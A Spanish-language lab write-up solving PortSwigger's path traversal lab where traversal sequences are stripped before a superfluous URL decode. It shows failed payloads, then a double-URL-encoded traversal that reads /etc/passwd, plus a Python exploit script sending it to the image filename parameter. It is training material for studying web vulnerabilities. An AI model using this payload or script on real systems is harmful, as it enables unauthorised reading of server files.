---
title: "04 File path traversal, traversal sequences stripped with superfluous URL-decode"
collection: publications
category: portswigger
permalink: publications/Directory Traversal/04_File path traversal, traversal sequences stripped with superfluous URL-decode
excerpt: 'Este laboratorio contiene una vulnerabilidad en la visualización de imágenes de productos. La aplicación bloquea la entrada que contenga secuencias de path traversal. A continuación, realiza una decodificación de URL de la entrada antes de utilizarla.'
date: 2024-12-07
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'File path traversal, traversal sequences stripped with superfluous URL-decode'
---

![logo]({{site.url}}/images/Directory Traversal/directory-traversal-04/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Directory Traversal/directory-traversal-04/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, recuperamos el contenido del archivo `/etc/passwd`.

## Analisis

Probamos y regresamos carpetas e ingresar desde alli `../../../etc/passwd` y vemos que nos arroja error.

![Conf1]({{site.url}}/images/Directory Traversal/directory-traversal-04/conf1.png)

Probamos con la ruta relativa `/etc/passwd` y vemos que nos arroja error.

![Conf2]({{site.url}}/images/Directory Traversal/directory-traversal-04/conf2.png)

Probamos con  `....//....//....//etc//passwd`  y vemos que nos arroja error.

![Conf3]({{site.url}}/images/Directory Traversal/directory-traversal-04/conf3.png)

## URL Encode

Probamos `url encode` ya que la aplicación comprueba la secuencia de texto codificado.

![Conf4]({{site.url}}/images/Directory Traversal/directory-traversal-04/conf4.png)

Vemos que la URL se encodea y nos arroja error.

![Conf5]({{site.url}}/images/Directory Traversal/directory-traversal-04/conf5.png)

Volvemos a encodear la url que ya esta encodeada.

![Conf6]({{site.url}}/images/Directory Traversal/directory-traversal-04/conf6.png)

## Aprobado

![Aprobado]({{site.url}}/images/Directory Traversal/directory-traversal-04/aprobado.png)

```python
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    image_url = url + '/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34'

    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
```